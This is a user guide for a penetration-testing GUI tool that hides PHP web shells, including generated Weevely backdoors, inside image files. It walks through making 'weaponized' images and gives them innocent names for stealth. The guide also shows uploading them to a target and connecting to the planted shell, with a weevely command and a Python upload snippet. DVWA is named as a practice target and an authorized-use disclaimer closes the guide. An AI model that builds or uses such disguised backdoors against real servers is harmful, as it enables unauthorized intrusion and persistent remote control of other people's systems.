# SilentTag GUI - User Guide

## Launch the Application

```bash
cd /home/darkbert/Desktop/web\ pentest
python3 silenttag_gui.py
```

Or use the launcher:
```bash
./launch_gui.sh
```

## GUI Features

### Main Interface Elements

1. **Legitimate Image Section**
   - Browse button: Select an existing image file (JPG, PNG, GIF, BMP)
   - Create Sample button: Generate a minimal valid image for testing
   
2. **PHP Shell File Section**
   - Browse button: Select your PHP backdoor file
   - Generate Weevely button: Create a new Weevely backdoor with custom password
   
3. **Output File Section**
   - Browse button: Choose where to save the weaponized image
   - Auto-suggests name based on input image
   
4. **Injection Method**
   - **Append** (Default): Most compatible, appends shell to end of image
   - **Prepend**: Preserves image header structure
   - **Comment**: Advanced metadata injection
   
5. **Inject Button**
   - Large button to start the injection process
   
6. **Output Log**
   - Real-time feedback showing what's happening
   - Color-coded messages (green=success, red=error, blue=info)
   
7. **Status Bar**
   - Shows current operation status at bottom

## Step-by-Step Workflow

### Method 1: Using Existing Files

1. **Launch GUI**
   ```bash
   python3 shell_injector_gui.py
   ```

2. **Select Image**
   - Click "Browse..." next to "Legitimate Image"
   - Choose any JPG, PNG, or GIF file
   - OR click "Create Sample" to generate one

3. **Select Shell**
   - Click "Browse..." next to "PHP Shell File"
   - Select your Weevely backdoor or custom PHP shell

4. **Choose Output Location**
   - Click "Browse..." next to "Output File"
   - Pick where to save the weaponized file
   - Name it something innocent (e.g., "vacation_photo.jpg")

5. **Select Method** (optional)
   - Keep "Append" selected for best compatibility
   - Or try "Prepend" or "Comment" for different techniques

6. **Click "INJECT SHELL INTO IMAGE"**
   - Watch the log for progress
   - Success message will appear when complete

7. **Upload & Use**
   - Upload the output file to your target
   - Connect with Weevely or access the shell

### Method 2: Generate Everything from GUI

1. **Launch GUI**

2. **Create Sample Image**
   - Click "Create Sample" button
   - Save as "photo.jpg" (or any name)
   - Image automatically selected

3. **Generate Weevely Backdoor**
   - Click "Generate Weevely" button
   - Enter password when prompted (e.g., "mypassword")
   - Save as "backdoor.php"
   - Shell automatically selected

4. **Choose Output**
   - Click "Browse..." for output
   - Save as "malicious.jpg" or similar

5. **Click "INJECT SHELL INTO IMAGE"**

6. **Done!**
   - Your weaponized image is ready

## Usage Examples

### Example 1: Quick Test with DVWA

```bash
# 1. Launch GUI
python3 shell_injector_gui.py

# 2. In GUI:
#    - Click "Create Sample" → save as "test.gif"
#    - Click "Generate Weevely" → password: "dvwa123", save as "shell.php"
#    - Output: "payload.gif"
#    - Click "INJECT SHELL INTO IMAGE"

# 3. Upload payload.gif to DVWA manually or via script

# 4. Connect:
weevely http://192.168.43.106/dvwa/hackable/uploads/payload.gif dvwa123
```

### Example 2: Stealth Attack with Real Image

```bash
# 1. Download a real image
wget https://picsum.photos/400/300 -O real_photo.jpg

# 2. Launch GUI
python3 shell_injector_gui.py

# 3. In GUI:
#    - Browse → select real_photo.jpg
#    - Generate Weevely → password: "secretpass"
#    - Output → "innocent_photo.jpg"
#    - Method: Append
#    - Click inject

# 4. Result: innocent_photo.jpg looks like a normal photo
#    but contains hidden backdoor
```

## GUI Advantages

✅ **No Command Line Required**
- Point and click interface
- No need to remember commands

✅ **Integrated Weevely Generation**
- Create backdoors directly from GUI
- No separate terminal commands

✅ **Visual Feedback**
- Real-time log output
- Color-coded status messages
- Progress indicators

✅ **File Browser Integration**
- Easy file selection with dialogs
- No typing file paths

✅ **Sample Image Creation**
- Generate test images instantly
- No need for external tools

✅ **Error Handling**
- Clear error messages
- Helpful troubleshooting info

## Keyboard Shortcuts

- **Alt+Tab**: Switch between GUI and terminal
- **Ctrl+C** (in terminal): Close GUI if it freezes

## Troubleshooting GUI

### GUI Won't Launch
```bash
# Check Python and tkinter are installed
python3 -c "import tkinter; print('OK')"

# If error, install tkinter:
sudo apt install python3-tk
```

### "Weevely Not Found" Error
```bash
# Ensure Weevely is in PATH
which weevely

# If not found, install or use "Browse" instead of "Generate"
```

### Can't See Output Files
- Check the output path you selected
- Look in same directory as input image
- Check GUI log for exact save location

### Injection Fails
- Verify input files exist and are readable
- Try different injection method
- Check log output for specific error
- Ensure output directory is writable

## CLI vs GUI Comparison

| Feature | CLI (`shell_injector.py`) | GUI (`shell_injector_gui.py`) |
|---------|---------------------------|-------------------------------|
| Ease of Use | Requires commands | Point and click |
| Batch Processing | ✅ Easy | ❌ One at a time |
| Automation | ✅ Scriptable | ❌ Manual |
| Visual Feedback | Basic text | ✅ Rich interface |
| Sample Creation | Via flag | ✅ Button click |
| Weevely Generation | Manual | ✅ Integrated |
| Learning Curve | Higher | Lower |

## Tips

1. **Use GIF format** for best compatibility with DVWA and similar targets
2. **Keep passwords memorable** when generating Weevely backdoors
3. **Name output files innocently** (e.g., "vacation.jpg" not "backdoor.jpg")
4. **Test locally first** before uploading to real targets
5. **Check log output** for detailed information about the injection

## Integration with Upload Scripts

After creating weaponized file in GUI:

```python
# Use in your Python upload script
import requests

session = requests.Session()
# ... login code ...

# Upload the GUI-generated file
with open('weaponized.jpg', 'rb') as f:
    files = {'uploaded': ('photo.jpg', f, 'image/jpeg')}
    response = session.post(target_url, files=files)
```

## Security Reminders

⚠️ **This tool is for authorized penetration testing only**
- Always have written permission
- Only test systems you own or are authorized to test
- Understand the legal implications in your jurisdiction

---

**Both CLI and GUI versions available:**
- CLI: `shell_injector.py` (advanced, scriptable)
- GUI: `shell_injector_gui.py` (beginner-friendly, visual)

Choose the one that fits your workflow!
